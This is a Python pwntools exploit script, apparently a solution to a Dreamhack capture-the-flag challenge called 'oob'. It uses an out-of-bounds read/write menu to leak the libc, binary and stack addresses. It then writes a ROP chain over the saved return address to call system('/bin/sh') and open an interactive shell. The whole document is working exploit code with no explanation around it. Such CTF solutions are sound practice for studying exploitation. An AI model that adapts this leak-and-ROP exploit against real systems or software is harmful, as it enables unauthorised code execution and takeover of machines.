#!/usr/bin/python3
from pwn import *

exe = ELF('./oob_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, n: sla(msg, str(n).encode())
san = lambda msg, n: sa(msg, str(n).encode())
sln = lambda n: sl(str(n).encode())
sn = lambda n: s(str(n).encode())

ru = lambda data: p.recvuntil(data)
rud = lambda data: p.recvuntil(data, drop=True)
rl = lambda p: p.recvline()
r = lambda count: p.recv(count)

leak = lambda i, offset = 0: u64(i.ljust(8, b'\0')) - offset
leak_hex = lambda i, offset = 0: int(i, 16) - offset
leak_dec = lambda i, offset = 0: int(i, 10) - offset
info = lambda msg, addr: log.info(msg + hex(addr))

def GDB():
	gdb.attach(p, gdbscript='''
		brva 0x00000000000013DB
		c
		''')

HOST = "host8.dreamhack.games"
PORT = 9141

if args.REMOTE:
	p = remote(HOST, PORT)
else:
	p = process(exe.path)

def read(offset):
	sla(b'> ', b'1')
	slan(b'offset: ', offset)
def write(offset, val):
	sla(b'> ', b'2')
	slan(b'offset: ', offset)
	slan(b'value: ', val)
def quit():
	sla(b'> ', b'3')
#GDB()
input()
libc_leak = b''
for x in range(6):	
	read(x + 16)
	libc_leak += r(1)
libc_leak = leak(libc_leak)
libc.address = libc_leak - libc.sym._IO_2_1_stdout_
info("leak libc: ",libc.address)

exe_leak = b''
for x in range(-1, -9, -1):
	read(x)
	exe_leak += r(1)
oob = u64(exe_leak[::-1]) + 0x8
exe.address = oob - exe.sym.oob
info("exe leak: ", exe.address)

offset = libc.sym.__environ - oob
stack = b''
for x in range(6):
	read(offset + x)
	stack += r(1)
stack = leak(stack)
saved_rip = stack - 0x120
info("stack : ",saved_rip)

pop_rdi = libc.address + 0x2a3e5
offset = saved_rip - oob
for x in range(8):
	write(offset + x, (pop_rdi >> 8 * x) & 0xff)
for x in range(8):
	write(offset + 0x8 + x, (next(libc.search(b'/bin/sh')) >> 8 * x) & 0xff)
for x in range(8):
	write(offset + 0x10 + x, ((pop_rdi + 1) >> 8 * x) & 0xff)
for x in range(8):
	write(offset + 0x18 + x, (libc.sym.system >> 8 * x) & 0xff)	
quit()

p.interactive()